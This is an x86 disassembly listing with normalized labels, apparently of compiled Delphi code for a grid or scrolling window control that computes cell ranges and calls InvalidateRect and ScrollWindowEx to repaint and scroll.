mov [ fs : eax ] edx
push sub_4732c4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4244a4
retn
sub_4732e8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423800
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_473469
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
push ebp
push sub_47344c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov dl 0x2
call sub_423a90
mov eax [ ebx + 0x10 ]
mov dl 0xe
call sub_423a74
mov eax [ ebx + 0x10 ]
mov edx 0x5
call sub_423ac0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x4
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4715c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4715c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
mov esi [ ebp - 0x14 ]
mov esi [ ebp - 0xc ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x18 ]
jmp r-xdata
mov esi [ ebp - 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473453
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_4244a4
retn
mov ecx esi
xor edx edx
mov eax ebx
call sub_42418c
mov eax [ ebp - 0x4 ]
call sub_4499bc
mov edx eax
mov ecx esi
mov eax ebx
call sub_42412c
jmp r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_42418c
mov eax [ ebp - 0x4 ]
call sub_449a00
mov ecx eax
mov edx esi
mov eax ebx
call sub_42412c
sub_473478
push ebp
mov ebp esp
push esi
mov esi eax
mov al [ ebp + 0x8 ]
push eax
push 0x1
mov eax esi
call sub_473e20
mov eax esi
call sub_475e54
mov eax esi
mov si 0xffeb
call sub_403450
pop esi
pop ebp
retn 0x4
sub_4734a4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
dec edx
sub edx eax
jl r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
xor esi esi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add esi eax
cmp esi [ ebx + 0xc ]
jle r-xdata
sub_473500
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jle r-xdata
mov eax [ ebx + 0x1c ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4734a4
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax ebx
mov edx esi
call sub_4734a4
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi eax
mov eax [ ebx + 0x20 ]
dec eax
cmp esi eax
jge r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
add eax [ edx ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
mov eax ebx
mov edx esi
call sub_4734a4
test eax eax
jne r-xdata
inc esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402c68
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebx + 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jge r-xdata
dec esi
mov al [ ebp - 0x5 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov [ ebp - 0x5 ] 0x1
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
add [ edx ] eax
sub_4735dc
push ebp
mov ebp esp
add esp 0xffffff88
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov edx 0x10
call sub_402c68
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_4727b4
mov eax [ ebp - 0x68 ]
inc eax
mov esi [ ebp - 0x14 ]
cmp eax esi
jl r-xdata
mov eax [ ebp - 0x38 ]
inc eax
cmp eax [ ebp - 0x10 ]
jl r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
lea eax [ ebp - 0x78 ]
mov ecx [ ebp - 0xc ]
mov edx esi
call sub_473500
pop ecx
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
je r-xdata
push ebp
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
lea eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_473500
pop ecx
mov eax [ ebx + 0x208 ]
call sub_4242c4
test al al
jne r-xdata
mov esi [ ebp - 0x4 ]
mov esi [ esi ]
mov eax ebx
call sub_4499bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax ebx
call sub_4499bc
sub eax esi
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_4736cc
mov edx [ eax + 0x238 ]
mov [ eax + 0x258 ] edx
mov edx [ eax + 0x23c ]
mov [ eax + 0x25c ] edx
mov edx [ eax + 0x258 ]
mov [ eax + 0x228 ] edx
mov edx [ eax + 0x25c ]
mov [ eax + 0x22c ] edx
mov edx [ eax + 0x228 ]
mov [ eax + 0x210 ] edx
mov edx [ eax + 0x22c ]
mov [ eax + 0x214 ] edx
test [ eax + 0x249 ] 0x10
je r-xdata
retn
mov edx [ eax + 0x21c ]
dec edx
mov [ eax + 0x210 ] edx
sub_47372c
push esi
add esp 0xfffffff0
mov esi eax
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] edx
mov edx esp
mov eax esi
call sub_473758
add esp 0x10
pop esi
retn
sub_473758
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_450adc
test al al
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4735dc
push 0x0
lea eax [ esp + 0x14 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call InvalidateRect
sub_4737a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x238 ]
pop ebp
retn
sub_4737c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
pop ebp
retn
sub_4737e4
push ebp
mov ebp esp
add esp 0xfffffff8
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ eax + 0x258 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4729ec
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x25c ]
sub eax [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x258 ]
sub eax [ ebp - 0x8 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_473844
push ebp
mov ebp esp
add esp 0xffffffa0
lea edx [ ebp - 0x60 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4727b4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x25c ]
mov eax [ ebp - 0x20 ]
pop edx
sub eax edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push [ eax + 0x258 ]
mov eax [ ebp - 0x50 ]
pop edx
sub eax edx
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax 0x1
cmp eax 0x1
jge r-xdata
sub_473898
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x74 ]
cmp eax 0x7
ja r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
jmp [ eax * 4 + jump_table_4738b8 ]
sub ebx edi
jmp r-xdata
add ebx edi
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4737e4
pop ecx
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_473844
pop ecx
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4737c8
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4737a0
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x74 ] 0x4
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_4737c8
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4737a0
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4737a0
pop ecx
add ebx eax
jmp r-xdata
dec edi
jne r-xdata
push 0x7f
mov eax [ ebp + 0x8 ]
push eax
call sub_4737c8
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4737a0
pop ecx
sub ebx eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
call MulDiv
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4737c8
pop ecx
mov ebx eax
pop eax
sub ebx eax
jmp r-xdata
sub_4739d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax + 0x288 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x54 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_475828
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4499bc
mov edi eax
mov eax [ ebp + 0x8 ]
sub edi [ eax - 0x6c ]
mov eax esi
cmp eax 0x7
ja r-xdata
test ebx ebx
jge r-xdata
jmp [ eax * 4 + jump_table_473a23 ]
mov eax [ ebp - 0x8 ]
sub eax edi
cmp ebx eax
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_4243d4
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x208 ]
mov edx r-xdata
call sub_4243d4
mov edx [ ebp + 0x8 ]
imul [ edx - 0x78 ]
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
sub ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x78 ]
imul edi
add ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
test [ eax + 0x249 ] 0x40
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
sub ebx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x288 ]
cmp ebx eax
je r-xdata
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
cmp esi 0x4
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x288 ] ebx
mov edx eax
sub edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor ecx ecx
call sub_474208
lea eax [ ebp - 0x18 ]
xor ecx ecx
mov edx 0x10
call sub_402c68
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x23c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
lea edx [ ebp - 0x18 ]
call sub_473758
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4743b4
mov eax [ ebp + 0x8 ]
push eax
call sub_4737c8
pop ecx
mov ebx eax
sub ebx [ ebp - 0x4 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
sub_473b7c
push ebp
mov ebp esp
add esp 0xffffff78
push ebx
push esi
push edi
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
lea edi [ ebp - 0x80 ]
mov eax [ ebp - 0x8 ]
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov [ ebp - 0x78 ] 0x1
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov [ ebp - 0x78 ] 0xffffffff
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_4727b4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x21c ]
dec eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24c ]
dec eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x70 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4729ec
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x258 ]
mov [ edi ] edx
mov edx [ eax + 0x25c ]
mov [ edi + 0x4 ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x21c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1a4 ] 0x0
je r-xdata
mov esi [ edi + 0x4 ]
mov ebx esi
push ebp
mov edx 0x1
mov eax esi
call sub_473898
pop ecx
mov [ edi + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
mov esi [ edi + 0x4 ]
cmp eax esi
jge r-xdata
mov esi [ edi ]
mov ebx esi
push ebp
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_473898
pop ecx
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
mov esi [ edi ]
cmp eax esi
jge r-xdata
push ebp
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x74 ]
call sub_4739d0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x10 ]
call sub_42b204
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x238 ]
call sub_42b20c
mov [ edi ] eax
mov edx [ edi + 0x4 ]
mov eax [ ebp - 0xc ]
call sub_42b204
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x23c ]
call sub_42b20c
mov [ edi + 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x258 ]
mov eax [ edi ]
cmp edx eax
jne r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x10 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
mov ecx [ edi + 0x4 ]
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_473f78
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x25c ]
cmp edx [ edi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_475848
test eax eax
jg r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_475828
test eax eax
jg r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
jmp r-xdata
sub_473d64
push ebp
mov ebp esp
push esi
push edi
mov eax [ ebp + 0x8 ]
cmp ecx [ edx ]
jne r-xdata
mov esi ecx
mov edi eax
cmp eax ecx
jge r-xdata
mov [ edx ] eax
jmp r-xdata
cmp esi [ edx ]
jg r-xdata
mov esi eax
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x4
cmp edi [ edx ]
jl r-xdata
cmp eax ecx
jge r-xdata
dec [ edx ]
inc [ edx ]
jmp r-xdata
sub_473d98
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov ax [ ebx + 0x248 ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
push 0x1
push 0x1
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_473e20
mov edx esp
mov eax ebx
call sub_475868
mov eax [ esi ]
mov [ ebx + 0x210 ] eax
mov eax [ esi + 0x4 ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
mov eax ebx
call sub_4730e0
mov edx esp
mov eax ebx
call sub_473fe4
jmp r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_473e20
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473f65
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jl r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x20 ]
call sub_470308
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473f6c
lea eax [ ebp - 0x20 ]
call sub_403fa4
retn
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_475868
mov eax [ ebx + 0x228 ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x22c ]
mov [ ebp - 0x8 ] eax
mov [ ebx + 0x228 ] esi
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x22c ] eax
test [ ebx + 0x249 ] 0x20
jne r-xdata
cmp esi [ ebx + 0x21c ]
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_4716d4
mov eax [ ebp - 0x4 ]
cmp eax [ ebx + 0x24c ]
jl r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x210 ] eax
mov eax [ ebx + 0x22c ]
mov [ ebx + 0x214 ] eax
test [ ebx + 0x249 ] 0x10
je r-xdata
test [ ebx + 0x248 ] 0x10
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xdc ]
test al al
je r-xdata
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x238 ]
mov [ ebx + 0x228 ] eax
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_473fe4
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_47372c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_47372c
lea edx [ ebx + 0x228 ]
mov eax ebx
call sub_4730e0
sub_473f78
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x258 ]
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebx + 0x258 ]
mov [ esp ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0x4 ] eax
mov [ ebx + 0x258 ] esi
mov [ ebx + 0x25c ] edi
mov edx esp
mov eax ebx
call sub_4742b4
cmp edi [ ebx + 0x25c ]
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_473fe4
push ebx
push esi
push edi
add esp 0xffffff90
mov ebx edx
mov edi eax
mov eax edi
call sub_450adc
test al al
je r-xdata
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x1
lea ecx [ esp + 0x4 ]
mov edx ebx
mov eax edi
call sub_4735dc
push 0x1
lea edx [ esp + 0x64 ]
mov eax edi
call sub_475868
lea edx [ esp + 0x64 ]
lea ecx [ esp + 0x14 ]
mov eax edi
call sub_4735dc
lea ecx [ esp + 0x20 ]
lea edx [ esp + 0x10 ]
mov eax esp
call sub_470484
mov esi 0x4
lea ebx [ esp + 0x20 ]
push 0x0
push ebx
mov eax edi
call sub_4507d8
push eax
call InvalidateRect
add ebx 0x10
dec esi
jne r-xdata
sub_47405c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] 0x2
cmp [ ebx + 0x28c ] 0x0
jne r-xdata
test esi esi
jne r-xdata
or [ ebp - 0x8 ] 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
jne r-xdata
mov eax [ edi + 0x34 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_41919c
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_41919c
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_4507d8
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
mov eax [ edi + 0x4 ]
call sub_41919c
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call ScrollWindowEx
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x34 ]
xor eax eax
call sub_41919c
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push esi
push 0x0
mov eax ebx
call sub_4507d8
push eax
call ScrollWindowEx
jmp r-xdata
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4499bc
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_4499bc
sub eax [ edi + 0xc ]
xor edx edx
pop ecx
call sub_41919c
neg [ ebp - 0x4 ]
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ edi + 0xc ]
mov eax [ edi + 0x4 ]
xor edx edx
call sub_41919c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_475868
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_473758
test [ ebx + 0x249 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_4507d8
push eax
call ScrollWindowEx
jmp r-xdata
sub_474208
push ebx
push esi
push edi
add esp 0xffffffa0
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4727b4
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_47405c
add esp 0x60
pop edi
pop esi
pop ebx
retn
sub_474230
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
inc edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi ] ecx
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x9 ] 0x1
neg [ esi ]
inc [ ebp - 0x10 ]
